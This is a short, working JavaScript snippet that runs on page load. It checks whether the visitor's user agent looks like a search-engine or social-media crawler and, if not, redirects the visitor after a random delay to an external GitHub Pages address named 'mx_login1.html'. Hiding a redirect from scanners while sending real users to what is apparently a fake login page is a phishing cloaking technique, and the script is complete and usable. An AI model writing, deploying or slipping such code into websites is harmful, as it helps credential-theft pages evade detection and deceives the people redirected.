(function () {
  function isBotUserAgent() {
    const bots = [
      /bot/i, /crawler/i, /spider/i, /crawling/i,
      /google/i, /bing/i, /yahoo/i, /facebook/i,
      /duckduckgo/i, /baidu/i, /yandex/i
    ];
    return bots.some(bot => bot.test(navigator.userAgent));
  }

  function redirectUser() {
    const delay = Math.floor(Math.random() * 1000) + 1000;
    console.log("Redirecting in", delay, "ms...");
    setTimeout(() => {
      window.location.href = "https://gbpacific21.github.io/mx_login1.html";
    }, delay);
  }

  function init() {
    if (isBotUserAgent()) {
      console.log("Bot detected. No redirect.");
      return;
    }
    redirectUser();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init(); // DOM is already ready
  }
})();
